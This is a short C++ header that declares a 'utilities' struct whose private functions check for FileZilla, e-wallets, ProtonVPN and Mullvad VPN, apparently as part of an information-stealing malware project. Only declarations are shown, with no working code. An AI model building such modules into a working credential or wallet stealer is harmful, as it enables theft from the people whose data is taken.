#pragma once

#include "../../win.h"

struct utilities {
public:
	void run();
private:
	void is_filezilla(std::string path);
	void is_ewallet(std::string system_disk, std::string user_name);
	void is_protonvpn(std::string path);
	void is_mullvadvpn(std::string path);
};

extern utilities g_utilities;